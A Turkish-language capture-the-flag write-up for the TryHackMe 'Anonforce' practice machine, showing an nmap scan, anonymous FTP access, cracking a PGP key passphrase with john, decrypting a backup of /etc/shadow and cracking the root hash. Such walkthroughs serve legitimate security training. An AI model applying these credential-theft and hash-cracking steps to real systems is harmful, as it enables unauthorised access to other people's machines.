---
title: 'TryHackMe | Anonforce WriteUp'
author: appdone
categories: [TryHackMe Challenges]
render_with_liquid: false
---

Bu yazımda TryHackMe platformunda bulunan “Anonforce” isimli makineyi çözeceğiz. Yeni başlayanlar için oldukça iyi bir makine olduğunu düşünüyorum. Öncelikle hedef hakkında biraz bilgi edinmek için nmap ile bir tcp port taraması yapacağız.

```console
$ nmap -sV -sC -T4 10.10.186.30
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Mar 17 13:20 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
> | drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| ...
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Tarama sonucunda 21 ve 22 numaralı portların açık olduğunu öğrendik. 21 numaralı portun üzerinde FTP servisi çalışıyor. Bu servisin yanlış yapılandırılmasından dolayı tüm dosya ve dizinleri anonim kullanıcı olarak görüntüleyebiliyoruz.

Öncelikle ftp servisine anonim kullanıcı olarak bağlanalım. Daha sonrada nmap taramasında gördüğümüz notread isimli dizini kontrol edelim.

```console
ftp> ls -la
...
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
...
```

Gördüğünüz üzere bu dizin içerisinde backup.pgp ve private.asc olmak üzere iki dosya bulunuyor. Bu dosyaları indirdikten sonra john aracılığıyla kıracağız. Tabi önce .asc dosyasını john’un anlayabileceği bir kıvama getirmemiz gerekiyor.

```console
$ gpg2john private.asc > hash
$ john hash -w=Desktop/rockyou.txt 
...
x***360          (anonforce)     
...
```

Parolayı elde ettikten sonra private.asc dosyasını parola eşliğinde içe aktarıyoruz.

```console
$ gpg --import private.asc 
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
```

private.asc dosyasını içe aktardıktan sonra backup.pgp dosyasının şifresini çözebilir ve içerisindeki dosyayı görüntüleyebiliriz. backup.pgp dosyası içerisinde /etc/shadow dosyası bulunuyormuş.

```console
$ gpg --decrypt backup.pgp                                                                                                                                                                
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences                                                                                                                       
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12                                                                                                                  
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
...
```

Dosya içerisindeki root kullanıcısının hash’ini alıp john ile kırdıktan sonra en yetkili hesaba sahip olduk.

```console
$ john hash2 -w=Desktop/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******           (?)     
...
```

Geriye sadece bayrakları toplamak kalıyor. SSH servisine bağlandıktan sonra ilk bayrağı /home/meliodas diğerini ise /root dizininde buluyoruz.
